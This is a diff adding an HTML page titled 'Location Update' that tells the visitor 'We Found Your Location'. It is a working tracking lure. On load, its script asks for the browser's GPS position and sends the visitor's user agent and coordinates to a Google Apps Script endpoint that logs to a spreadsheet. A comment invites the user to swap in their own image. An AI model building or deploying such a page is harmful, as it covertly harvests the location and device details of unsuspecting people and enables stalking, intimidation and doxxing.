@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Update</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f5f5f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 90%;
+        }
+        img {
+            width: 100%;
+            max-width: 300px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+        h2 { margin: 0 0 10px 0; color: #333; }
+        p { color: #666; font-size: 14px; }
+        .status { margin-top: 10px; font-weight: bold; color: #28a745; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- REPLACE THE SRC BELOW WITH YOUR IMAGE LINK -->
+    <img src="https://i.postimg.cc/LXZpHF7Y/IMG-1565.jpg" alt="Map Screenshot">
+    
+    <h2>We Found Your Location</h2>
+    <p>Verifying details...</p>
+    <div id="status" class="status"></div>
+</div>
+
+<script>
+    // Function to send data to your Google Sheet
+    function logData(ip, ua, lat, long) {
+        var url = "https://script.google.com/macros/s/AKfycbwPRP7G9tH8BOdETBHR_hCnTEllPJ2NxWZe4J4pOh-edcyRwVyxoUSBP07nObF09h4a/exec"; 
+        // Note: The fetch request appends these as query parameters
+        
+        // Try to get GPS first
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                var lat = position.coords.latitude;
+                var long = position.coords.longitude;
+                document.getElementById('status').innerText = "Location Verified!";
+                
+                // Send to Google Sheets
+                fetch(url + "?ip=" + ip + "&ua=" + ua + "&lat=" + lat + "&long=" + long);
+            }, function(error) {
+                document.getElementById('status').innerText = "Data Saved.";
+                fetch(url + "?ip=" + ip + "&ua=" + ua + "&gps=Denied");
+            });
+        } else {
+            document.getElementById('status').innerText = "Data Saved.";
+            fetch(url + "?ip=" + ip + "&ua=" + ua + "&gps=Unsupported");
+        }
+    }
+
+    // Simple IP detection (since we can't use external APIs without keys easily)
+    // We send 'unknown' for IP unless you use a specific API, but the User Agent is enough to identify device.
+    logData("GitHub-Hosted", navigator.userAgent, null, null);
+</script>
+
+</body>
+</html>
